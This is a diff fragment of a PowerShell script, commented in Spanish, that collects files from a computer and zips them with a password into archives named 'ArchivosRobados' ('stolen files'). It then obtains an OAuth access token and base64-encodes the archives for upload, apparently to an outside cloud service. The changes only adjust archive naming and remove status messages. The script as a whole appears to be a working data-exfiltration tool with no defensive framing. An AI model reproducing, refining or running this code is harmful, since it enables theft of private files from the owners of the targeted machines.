@@ -141,7 +141,7 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Files copied" -ForegroundColor Green
-$ArchivosRobados = "$env:computername"
+$ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
 Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\ArchivosRobados-"$ArchivosRobados".zip -Format Zip -Password "$pwd1"
 
 Start-Sleep -s 5
@@ -170,14 +170,10 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$ArchivosRobados = "$env:computername"
-$FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
-Write-Host "Nombre de Archivos Robados: $ArchivosRobados" -ForegroundColor Green
+$ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item c:\temp\ArchivosRobados-"$ArchivosRobados".zip
-Write-Host "$FileEncrypted" -ForegroundColor Green
-
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
 
@@ -248,7 +244,7 @@ $accessToken = (Invoke-RestMethod @params).access_token
 $NomComputadora = "$env:computername"
 
 # Get the source file contents and details, encode in base64
-$sourceItem = Get-Item 'c:\temp\backup-"$NomComputadora".zip'
+$sourceItem = Get-Item c:\temp\backup-"$NomComputadora".zip
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
 
@@ -319,7 +315,7 @@ $accessToken = (Invoke-RestMethod @params).access_token
 $NomComputadora = "$env:computername"
 
 # Get the source file contents and details, encode in base64
-$sourceItem = Get-Item 'c:\temp\backup1-"$NomComputadora".zip'
+$sourceItem = Get-Item c:\temp\backup1-"$NomComputadora".zip
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
 
